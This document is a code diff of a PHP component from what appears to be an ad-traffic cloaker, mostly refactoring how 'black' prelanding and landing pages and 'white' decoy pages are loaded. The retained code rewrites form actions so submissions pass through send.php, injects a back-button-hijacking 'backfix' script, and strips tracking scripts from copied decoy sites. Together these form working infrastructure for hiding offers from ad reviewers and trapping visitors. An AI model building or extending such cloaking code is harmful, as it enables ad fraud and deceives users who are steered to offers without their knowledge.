@@ -1,4 +1,5 @@
 <?php
+
 require_once __DIR__ . '/requestfunc.php';
 require_once __DIR__ . '/paths.php';
 require_once __DIR__ . '/htmlinject.php';
@@ -10,22 +11,18 @@ function load_content_with_include($url): string
     ob_start();
     $fulldir = __DIR__ . '/' . $url;
     if (
-    str_ends_with($fulldir, ".php") ||
-    str_ends_with($fulldir, ".html") ||
-    str_ends_with($fulldir, ".htm")
+        str_ends_with($fulldir, ".php") ||
+        str_ends_with($fulldir, ".html") ||
+        str_ends_with($fulldir, ".htm")
     ) {
         require $fulldir;
-    }
-    // Check for each file and require/include the first one that exists
-    else if (file_exists($fulldir . '/index.php')) {
+    } elseif (file_exists($fulldir . '/index.php')) {
         require $fulldir . '/index.php';
     } elseif (file_exists($fulldir . '/index.html')) {
         require $fulldir . '/index.html';
     } elseif (file_exists($fulldir . '/index.htm')) {
         require $fulldir . '/index.htm';
-    }
-    //Not Found
-    else {
+    } else {
         http_response_code(404);
         echo $url . ' Not Found!';
     }
@@ -35,7 +32,7 @@ function load_content_with_include($url): string
 }
 
 //Load content of black landing from another folder
-function load_prelanding(Campaign $c, string $url, int $land_number): string
+function load_prelanding(Campaign $c, int $flowIndex, string $url, int $landIndex): string
 {
     $fullpath = get_abs_from_rel($url);
 
@@ -54,15 +51,10 @@ function load_prelanding(Campaign $c, string $url, int $land_number): string
     $html = preg_replace('/(<a[^>]+)(target="_blank")/i', "\\1", $html);
 
     $cloaker = get_cloaker_path();
-    $querystr = $_SERVER['QUERY_STRING']??'';
-    
-    // Function to generate landing URL with specific landing number
-    $getLandingUrl = function($landNum) use ($cloaker, $c, $querystr) {
-        return $cloaker . 'landing.php?l=' . $landNum . "&campId=" . $c->campaignId . (!empty($querystr) ? '&' . $querystr : '');
-    };
+    $querystr = $_SERVER['QUERY_STRING'] ?? '';
+    $querystr = !empty($querystr) ? '&' . $querystr : '';
+    $replacement = $cloaker . 'landing.php?l=' . $landIndex . '&f=' . $flowIndex . "&campId=" . $c->campaignId . $querystr;
 
-    // Generate base replacement for {offer}
-    $replacement = $getLandingUrl($land_number);
 
     //if we will be replacing the prelanding with the landing, then the landing should be opened in a new window
     if ($c->scripts->replacePrelanding) {
@@ -73,30 +65,21 @@ function load_prelanding(Campaign $c, string $url, int $land_number): string
 
     // replace the default {offer} macro
     $html = preg_replace('/\{offer\}/', $replacement, $html);
-    
-    // replace all numbered offers {offer:N} with corresponding landing numbers (N-1)
-    $html = preg_replace_callback('/\{offer:(\d+)\}/', function($matches) use ($getLandingUrl, $c) {
-        $landNum = intval($matches[1]) - 1; // Convert offer number to 0-based landing number
-        $replacement = $getLandingUrl($landNum);
-        if ($c->scripts->replacePrelanding) {
-            $replacement .= '" target="_blank"';
-        }
-        return $replacement;
-    }, $html);
 
-    $url = $mp->replace_url_macros($c->scripts->backfixAddress); 
-    $second = $mp->replace_url_macros($c->scripts->backfixSecondAddress); 
-
-    if ($c->scripts->backfix)
+    if ($c->scripts->backfix) {
+        $url = $mp->replace_url_macros($c->scripts->backfixAddress);
+        $second = $mp->replace_url_macros($c->scripts->backfixSecondAddress);
         $html = add_backfix($html, $url, $second);
+    }
 
-    if ($c->scripts->imagesLazyLoad)
+    if ($c->scripts->imagesLazyLoad) {
         $html = add_images_lazy_load($html);
+    }
     return $html;
 }
 
 //Load content of black landing from another folder
-function load_landing(Campaign $c, string $url)
+function load_landing(Campaign $c, int $flowIndex, string $url)
 {
     $fullpath = get_abs_from_rel($url);
 
@@ -107,42 +90,46 @@ function load_landing(Campaign $c, string $url)
 
     $query = http_build_query($_GET);
     $html = preg_replace_callback(
-    '/\saction=[\'\"]([^\'\"]+)[\'\"]/',
-    function ($matches) use ($query) {
-        $originalAction = urlencode($matches[1]);
-        $send = " action=\"../send.php?original_action={$originalAction}";
-        if ($query !== '')
-            $send .= "&" . $query;
-        $send .= "\"";
-        return $send;
-    },
-    $html
+        '/\saction=[\'\"]([^\'\"]+)[\'\"]/',
+        function ($matches) use ($query) {
+            $originalAction = urlencode($matches[1]);
+            $send = " action=\"../send.php?original_action={$originalAction}";
+            if ($query !== '') {
+                $send .= "&" . $query;
+            }
+            $send .= "\"";
+            return $send;
+        },
+        $html
     );
 
     $mp = new MacrosProcessor();
-    //if we will be replacing the landing when going to the Thank You page, then the Thank You page should open in a new window
+    //if we will be replacing the landing when going to the Thank You page,
+    //then the Thank You page should open in a new window
     if ($c->scripts->replaceLanding) {
         $replacelandurl = $mp->replace_url_macros($c->scripts->replaceLandingAddress); //replace macros
         $html = insert_file_content($html, 'replacelanding.js', '</body>', true, true, '{REDIRECT}', $replacelandurl);
     }
 
     $html = insert_file_content($html, "fixanchors.js", "<body", false, true);
-    
+
     $html = $mp->replace_html_macros($html);
     //replace phone field with more convenient type - tel + add autocomplete
     $html = fix_phone_and_name($html);
 
 
     //adding backfix ONLY if we don't have a prelanding, cause prelanding will have it
-    if ($c->black->preland->action==='none') {
-        $url = $mp->replace_url_macros($c->scripts->backfixAddress); 
-        $second = $mp->replace_url_macros($c->scripts->backfixSecondAddress); 
-        if ($c->scripts->backfix)
+    if (!$c->black->flows[$flowIndex]->hasPrelanding()) {
+        if ($c->scripts->backfix) {
+            $url = $mp->replace_url_macros($c->scripts->backfixAddress);
+            $second = $mp->replace_url_macros($c->scripts->backfixSecondAddress);
             $html = add_backfix($html, $url, $second);
+        }
     }
-    
-    if ($c->scripts->imagesLazyLoad)
+
+    if ($c->scripts->imagesLazyLoad) {
         $html = add_images_lazy_load($html);
+    }
 
     return $html;
 }
@@ -202,7 +189,7 @@ function add_images_lazy_load($html)
 }
 
 //load white page from FOLDER
-function load_white_content($url):string
+function load_white_content($url): string
 {
     $html = load_content_with_include($url);
     $baseurl = '/' . $url . '/';
@@ -217,7 +204,7 @@ function load_white_content($url):string
 }
 
 //loading white page with CURL
-function load_white_curl(string $url):string
+function load_white_curl(string $url): string
 {
     $res = get($url);
     $html = $res['content'];
@@ -228,19 +215,19 @@ function load_white_curl(string $url):string
     $html = preg_replace('/(<link rel=\"canonical\" [^>]+>)/', "", $html);
     //killing tracking scripts
     $tracking_scripts = array(
-    'google_analytics' => 'https://www.google-analytics.com/analytics.js',
-    'google_tag_manager' => 'https://www.googletagmanager.com/gtag/js',
-    'facebook_pixel' => 'connect.facebook.net/en_US/fbevents.js',
-    'twitter_conversion' => 'https://platform.twitter.com/oct.js',
-    'linkedin_insight_tag' => 'https://snap.licdn.com/li.lms-analytics/insight.min.js',
-    'pinterest_tag' => '//s.pinimg.com/ct/core.js',
-    'adobe_dtm' => 'https://assets.adobedtm.com',
-    'adobe_analytics' => '.sc.omtrdc.net/s/s_code.js',
-    'hubspot_tracking_code' => '//js.hs-scripts.com/',
-    'bing_ads' => '//bat.bing.com/bat.js',
-    'crazy_egg' => '//script.crazyegg.com/pages/scripts/',
-    'yandex_metrika' => 'https://mc.yandex.ru/metrika/tag.js',
-    'hotjar' => 'static.hotjar.com/c/hotjar'
+        'google_analytics' => 'https://www.google-analytics.com/analytics.js',
+        'google_tag_manager' => 'https://www.googletagmanager.com/gtag/js',
+        'facebook_pixel' => 'connect.facebook.net/en_US/fbevents.js',
+        'twitter_conversion' => 'https://platform.twitter.com/oct.js',
+        'linkedin_insight_tag' => 'https://snap.licdn.com/li.lms-analytics/insight.min.js',
+        'pinterest_tag' => '//s.pinimg.com/ct/core.js',
+        'adobe_dtm' => 'https://assets.adobedtm.com',
+        'adobe_analytics' => '.sc.omtrdc.net/s/s_code.js',
+        'hubspot_tracking_code' => '//js.hs-scripts.com/',
+        'bing_ads' => '//bat.bing.com/bat.js',
+        'crazy_egg' => '//script.crazyegg.com/pages/scripts/',
+        'yandex_metrika' => 'https://mc.yandex.ru/metrika/tag.js',
+        'hotjar' => 'static.hotjar.com/c/hotjar'
     );
     foreach ($tracking_scripts as $key => $url) {
         $pattern = '#<script[^>]*(src="[^"]*' . preg_quote($url) . '[^"]*")[^>]*>.*?</script>|<script[^>]*>[^<]*' . preg_quote($url) . '[^<]*</script>#is';
@@ -255,10 +242,10 @@ function load_white_curl(string $url):string
     return $html;
 }
 
-function add_backfix(string $html, $url, $second):string
+function add_backfix(string $html, $url, $second): string
 {
-    $debug = DebugMethods::On()?'true':'false';
-    $path = get_cloaker_path(true,false);
+    $debug = DebugMethods::On() ? 'true' : 'false';
+    $path = get_cloaker_path(true, false);
     $jsCode = <<<EOT
     <script src='{$path}/scripts/backfix.php' 
         data-backlink='{$url}' 
@@ -269,7 +256,9 @@ function add_backfix(string $html, $url, $second):string
     </script>
 EOT;
     $needle = '</head>';
-    if (!str_contains($html,$needle)) $needle = '</body>';
+    if (!str_contains($html, $needle)) {
+        $needle = '</body>';
+    }
     return insert_before_tag($html, $needle, $jsCode);
 }
 
